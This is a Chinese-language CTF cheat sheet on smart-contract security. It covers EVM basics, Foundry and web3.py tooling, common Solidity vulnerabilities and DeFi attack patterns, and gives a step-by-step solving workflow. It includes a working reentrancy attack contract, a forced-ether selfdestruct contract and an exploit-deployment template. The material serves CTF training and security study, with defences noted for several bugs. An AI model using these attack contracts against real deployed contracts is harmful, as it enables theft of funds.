# CTF Misc - Blockchain / Smart Contract Security

> **适用版本**: Solidity 0.8.x, Foundry (forge/cast/anvil), Hardhat, Python web3.py 6.x+

---

## Table of Contents
- [识别 Blockchain CTF](#识别-blockchain-ctf)
- [EVM 基础](#evm-基础)
- [环境搭建](#环境搭建)
- [常见漏洞与攻击](#常见漏洞与攻击)
- [DeFi 攻击模式](#defi-攻击模式)
- [CTF 常用工具与技巧](#ctf-常用工具与技巧)
- [解题流程](#解题流程)

---

## 识别 Blockchain CTF

**题目特征**：
- 提供 `.sol` 源码或合约地址
- 题目描述含 "deploy / contract / Ethereum / Solidity / EVM"
- 提供 RPC endpoint (如 `http://challenge:8545`)
- 目标：使某个 `isSolved()` 返回 true，或窃取合约中的 ETH/token

**常见平台**：
- Paradigm CTF — 高难度 DeFi 题
- Ethernaut (OpenZeppelin) — 入门训练
- Damn Vulnerable DeFi — DeFi 专项
- 各大 CTF 的 Misc/Blockchain 分类

---

## EVM 基础

### 关键概念速查

| 概念 | 说明 |
|------|------|
| EOA | 外部账户 (用户钱包)，有私钥 |
| Contract | 合约账户，有 code + storage |
| msg.sender | 当前调用者地址 |
| tx.origin | 最初发起交易的 EOA |
| storage | 合约持久化存储，256-bit slot |
| memory | 临时内存，函数调用内有效 |
| calldata | 外部调用的只读输入数据 |
| gas | 执行费用，CTF 中通常不限 |
| block.timestamp | 区块时间戳 (矿工可微调) |
| blockhash | 仅最近 256 个区块可用 |

### Storage Layout
```solidity
// Slot 分配规则：
// - 定长变量按声明顺序分配 slot (从 slot 0 开始)
// - 小于 32 bytes 的变量可能共享同一 slot (packing)
// - mapping(key => value): slot = keccak256(key . slot_index)
// - dynamic array: length at slot_index, data at keccak256(slot_index)

// 读取任意 storage slot:
cast storage <contract_addr> <slot_number> --rpc-url <rpc>
// 或 Python:
web3.eth.get_storage_at(contract_addr, slot_number)
```

### 调用约定
```
calldata = function_selector (4 bytes) + abi_encoded_args
function_selector = keccak256("functionName(argType1,argType2)")[:4]
```

---

## 环境搭建

### Foundry (推荐)
```bash
# 安装
curl -L https://foundry.paradigm.xyz | bash
foundryup

# 核心工具
forge  — 编译、测试、部署
cast   — 链上交互 (读 storage、发交易、ABI 编解码)
anvil  — 本地 EVM 节点 (fork 模式)

# 本地测试链
anvil  # 默认 http://127.0.0.1:8545, 10 个预充值账户

# 编译合约
forge build

# 运行测试 (Solidity 写测试)
forge test -vvvv  # -v 级别越高输出越详细

# 部署合约
forge create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PK

# 调用合约函数
cast send $CONTRACT "solve()" --rpc-url $RPC --private-key $PK
cast call $CONTRACT "isSolved()" --rpc-url $RPC
```

### Python web3.py
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('http://challenge:8545'))
account = w3.eth.account.from_key('0xPRIVATE_KEY')

# 读 storage
value = w3.eth.get_storage_at('0xCONTRACT', 0)

# 发送交易
tx = {
    'to': '0xCONTRACT',
    'data': '0x....',  # calldata
    'gas': 3000000,
    'gasPrice': w3.eth.gas_price,
    'nonce': w3.eth.get_transaction_count(account.address),
}
signed = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

# ABI 交互
from web3 import Web3
contract = w3.eth.contract(address='0xCONTRACT', abi=ABI_JSON)
result = contract.functions.isSolved().call()
contract.functions.solve().transact({'from': account.address})
```

---

## 常见漏洞与攻击

### Reentrancy (重入攻击)
```solidity
// 漏洞合约 — 先转账再更新余额
function withdraw() public {
    uint bal = balances[msg.sender];
    (bool ok, ) = msg.sender.call{value: bal}("");  // 外部调用
    balances[msg.sender] = 0;  // 状态更新在后 → 重入
}

// 攻击合约
contract Attack {
    Victim victim;
    constructor(address _v) { victim = Victim(_v); }

    function attack() external payable {
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }

    // 收到 ETH 时自动触发 → 再次调用 withdraw
    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();
        }
    }
}
```
**防御**: Checks-Effects-Interactions 模式, ReentrancyGuard, 先更新再转账

### tx.origin 认证绕过
```solidity
// 漏洞: 用 tx.origin 做权限检查
function transfer(address to, uint amount) public {
    require(tx.origin == owner);  // 应该用 msg.sender!
    // ...
}
// 攻击: 诱导 owner 调用攻击合约 → 攻击合约调用 transfer → tx.origin == owner
```

### Integer Overflow/Underflow
```solidity
// Solidity <0.8.0 无自动溢出检查
uint8 x = 255; x += 1;  // → 0 (overflow)
uint8 y = 0; y -= 1;     // → 255 (underflow)

// Solidity >=0.8.0 默认检查, 但 unchecked{} 可绕过
unchecked { x += 1; }  // 不检查溢出
```

### delegatecall 存储覆盖
```solidity
// delegatecall 在调用者的 context 中执行被调用合约的代码
// → 被调用合约修改的 storage slot 实际是调用者的 slot

// 漏洞模式: Proxy + Implementation
// 如果 Implementation 的 storage layout 与 Proxy 不同
// → delegatecall 会覆盖 Proxy 的关键变量 (如 owner)

// 攻击: 找到一个函数, 其写入的 slot 恰好对应 Proxy 的 owner slot
```

### selfdestruct 强制转账
```solidity
// selfdestruct 可以强制向任意地址发送 ETH
// 即使目标合约没有 receive/fallback, 也无法拒绝
// 用途: 破坏依赖 address(this).balance 的逻辑

contract ForceEther {
    constructor(address payable target) payable {
        selfdestruct(target);  // 强制发送 ETH
    }
}
// Solidity 0.8.24+ selfdestruct 仅在同一交易中创建时才销毁
```

### Access Control 缺失
```solidity
// 常见: 关键函数忘加 onlyOwner / 权限检查
// 直接调用: cast send $CONTRACT "setOwner(address)" $MY_ADDR
// 检查: 阅读合约所有 public/external 函数, 看哪些缺少权限检查
```

### 随机数可预测
```solidity
// 链上 "随机数" 全部可预测:
// block.timestamp, block.number, blockhash — 矿工/同区块可控
// keccak256(abi.encodePacked(block.timestamp, msg.sender)) — 可提前计算

// 攻击: 在攻击合约中计算相同的 "随机数", 同一交易提交
```

### Storage Collision (Proxy Pattern)
```solidity
// EIP-1967 Proxy: implementation 地址存在特定 slot
// slot = keccak256("eip1967.proxy.implementation") - 1
// 如果能覆盖这个 slot → 替换 implementation → 控制整个 proxy
```

### Signature Replay
```solidity
// 签名缺少 nonce/chainId/address → 可重放
// 攻击: 在链 A 拿到的签名, 在链 B 重放
// 或: 同一签名多次提交

// 检查: ecrecover 的参数是否包含足够的唯一性
```

---

## DeFi 攻击模式

### Flash Loan (闪电贷)
```solidity
// 同一交易内: 借 → 操纵 → 归还 (无需抵押)
// 平台: Aave, dYdX, Uniswap

// 常见攻击流:
// 1. 闪电贷借大量 token
// 2. 操纵价格预言机 (AMM 池)
// 3. 以操纵后的价格执行目标操作 (清算/套利)
// 4. 归还贷款 + 手续费

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}
```

### Price Oracle Manipulation
```solidity
// AMM 价格 = reserve_A / reserve_B
// 大额 swap → 价格偏移 → 利用被操纵的价格获利
// 防御: 使用 TWAP (时间加权平均价格) 而非即时价格
```

### Sandwich Attack
```
// 在目标交易前后插入交易:
// 1. Front-run: 在目标交易前买入 → 抬高价格
// 2. 目标交易以更高价格执行
// 3. Back-run: 在目标交易后卖出 → 获利
```

---

## CTF 常用工具与技巧

### 反编译 Bytecode (无源码时)
```bash
# 获取合约 bytecode
cast code $CONTRACT --rpc-url $RPC

# 在线反编译
# https://ethervm.io/decompile
# https://app.dedaub.com/decompile

# 本地: panoramix / heimdall
# pip install panoramix-decompiler (旧)
# cargo install heimdall (推荐)
heimdall decompile -t $BYTECODE
```

### 调试交易
```bash
# Foundry trace
cast run $TX_HASH --rpc-url $RPC

# Forge debug (本地)
forge test --debug "testExploit"

# Tenderly (在线) — 免费交易模拟和 trace
```

### 常用 cast 命令
```bash
# ABI 编码
cast abi-encode "transfer(address,uint256)" 0xADDR 1000000

# 计算 function selector
cast sig "transfer(address,uint256)"  # → 0xa9059cbb

# 解码 calldata
cast 4byte-decode 0xa9059cbb000000...

# 读取 storage slot
cast storage $CONTRACT 0 --rpc-url $RPC
cast storage $CONTRACT 1 --rpc-url $RPC

# keccak256
cast keccak "transfer(address,uint256)"

# 发送 ETH
cast send $TO --value 1ether --rpc-url $RPC --private-key $PK
```

### Foundry Exploit 模板
```solidity
// test/Exploit.t.sol
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/Challenge.sol";

contract ExploitTest is Test {
    Challenge challenge;

    function setUp() public {
        // Fork 远程链
        vm.createSelectFork("http://challenge:8545");
        challenge = Challenge(0xCHALLENGE_ADDR);
    }

    function testExploit() public {
        // 攻击逻辑
        challenge.vulnerableFunction();

        // 验证
        assertTrue(challenge.isSolved());
    }
}
// 运行: forge test -vvvv --match-test testExploit
```

---

## 解题流程

```
1. 连接 RPC, 获取合约地址和源码
   cast chain-id --rpc-url $RPC
   cast code $CONTRACT --rpc-url $RPC

2. 阅读合约源码, 找到 isSolved() 条件

3. 识别漏洞类型 (对照上方漏洞列表)

4. 本地复现: anvil fork + forge test

5. 编写 exploit 合约/脚本

6. 部署 exploit 到目标链
   forge create Exploit --rpc-url $RPC --private-key $PK
   cast send $EXPLOIT "attack()" --rpc-url $RPC --private-key $PK

7. 验证: cast call $CONTRACT "isSolved()" --rpc-url $RPC
```

**卡住时检查**:
- 是否需要先获取 ETH (faucet / selfdestruct)?
- storage layout 是否和预期一致? (cast storage 逐 slot 检查)
- 是否需要在同一交易中完成所有操作? (写攻击合约而非 EOA 多笔交易)
- 是否有 block.number / block.timestamp 依赖? (同一区块内完成)
